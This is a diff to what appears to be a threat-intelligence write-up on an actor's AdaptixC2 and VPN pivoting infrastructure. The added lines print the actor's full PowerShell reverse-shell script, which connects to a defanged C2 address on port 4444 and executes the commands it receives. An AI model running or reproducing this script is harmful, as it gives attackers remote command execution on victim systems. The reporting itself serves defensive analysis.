@@ -108,6 +108,22 @@ From exposed payloads, we've established this threat actor is leveraging Adapdix
 [![1](/assets/images/cpanel/6.png){: .align-center .img-border}](/assets/images/cpanel/6.png)
 <p class="figure-caption">AdaptixC2 service exposed</p>
 
+We also observed the file `init.ps1`, a simple PowerShell-based reverse-shell configured to the C2 IP address: 
+
+```python
+$client = New-Object System.Net.Sockets.TcpClient("95.111.250[.]175",4444)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+  $sendback = (powershell -c "$data" 2>&1 | Out-String)
+  $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+  $stream.Write($sendbyte,0,$sendbyte.Length)
+  $stream.Flush()
+}
+```
+
 Ctrl-Alt-Intel assess the threat actor leveraged OpenVPN & Ligolo to establish a pivoting network, providing persistent access to internal victim networks.    
 
 **OpenVPN***
